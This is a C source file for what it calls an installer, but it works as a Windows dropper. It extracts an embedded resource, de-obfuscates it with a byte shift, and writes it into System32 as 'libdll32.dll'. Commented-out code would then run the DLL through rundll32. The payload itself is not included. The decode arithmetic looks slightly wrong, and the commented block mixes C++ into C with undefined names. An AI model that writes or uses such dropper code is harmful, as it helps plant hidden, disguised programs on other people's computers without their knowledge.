#include "installer.h"
#include "resource.h"

#define DLL_NAME L"libdll32.dll"

int main(int argc, char** argv) {
	printf("Finding resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		consoleError(GetLastError(), L"FindResourceW");
		return 1;
	}

	DWORD resourceSize = SizeofResource(NULL, resourceHandle);

	if(!resourceSize) {
		consoleError(GetLastError(), L"SizeofResource");
		return 1;
	}

	printf("Resource size: %lu byte(s)\nLoading resource\n", resourceSize);
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(!resource) {
		consoleError(GetLastError(), L"LoadResource");
		return 1;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		consoleError(GetLastError(), L"LockResource");
		return 1;
	}

	BYTE* buffer = malloc(resourceSize);

	if(!buffer) {
		consoleError(GetLastError(), L"malloc");
		return 1;
	}

	printf("Allocate memory: %lu byte(s)\n", resourceSize);

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	wchar_t* system32 = getSystem32Directory();
	printf("System32: %ws\n", system32);
	wchar_t* dllFile = mergePath(system32, DLL_NAME);
	printf("DLL: %ws\nCreate file\n", dllFile);
	HANDLE file = CreateFileW(dllFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		consoleError(GetLastError(), L"CreateFileW");
		return 1;
	}

	DWORD written = 0;
	
	if(!WriteFile(file, buffer, resourceSize, &written, NULL)) {
		consoleError(GetLastError(), L"WriteFile");
		return 1;
	}

	printf("Size:    %lu byte(s)\nWritten: %lu byte(s)\n", resourceSize, written);

	if(!CloseHandle(file)) {
		consoleError(GetLastError(), L"CloseHandle");
		return 1;
	}

	printf("File closed\n");
	//wchar_t* rundll32File = mergePath(system32, L"rundll32.exe");
	//printf("rundll32: %ws\n", rundll32File);
	free(system32);
	//free(rundll32File);
	free(dllFile);
	/*STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformation = {0};
	std::wstring argument(rundll32);
	argument += L" ";
	argument += FILE_NAME;
	argument += L",Install";
	wchar_t* programArgument = const_cast<wchar_t*>(argument.c_str());
	printf("Running DLL File\n");

	if(CreateProcessW(rundll32, programArgument, NULL, NULL, TRUE, NULL, NULL, NULL, &startupInformation, &processInformation) == NULL) {
		HI_FormatError(GetLastError(), "CreateProcessW()");
		return -1;
	}

	printf("Closing Handles\n");

	if(CloseHandle(processInformation.hProcess) == NULL) {
		HI_FormatError(GetLastError(), "CloseHandle()");
		return -1;
	}

	if(CloseHandle(processInformation.hThread) == NULL) {
		HI_FormatError(GetLastError(), "CloseHandle()");
		return -1;
	}*/

	return 0;
}
